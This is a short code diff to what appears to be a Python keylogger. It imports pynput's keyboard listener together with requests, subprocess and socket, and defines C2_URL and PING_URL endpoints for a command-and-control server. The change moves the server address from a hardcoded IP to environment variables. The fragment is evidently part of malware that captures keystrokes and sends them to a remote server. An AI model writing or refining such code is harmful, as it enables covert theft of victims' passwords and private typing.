@@ -1,3 +1,4 @@
+from dotenv import load_dotenv
 from pynput import keyboard
 import requests
 import threading
@@ -7,13 +8,15 @@ import subprocess
 import hashlib
 import os
 import socket
+import os
 
-C2_URL = "https://13.61.176.16:8443/log"
-PING_URL = "https://13.61.176.16:8443/ping"
+load_dotenv()
 
+SERVER_IP = os.getenv("SERVER_IP")
+SERVER_PORT = os.getenv("SERVER_PORT", "8443")
 
-
-
+C2_URL = f"https://{SERVER_IP}:{SERVER_PORT}/log"
+PING_URL = f"https://{SERVER_IP}:{SERVER_PORT}/ping"
 
 HOSTNAME = platform.node()
 
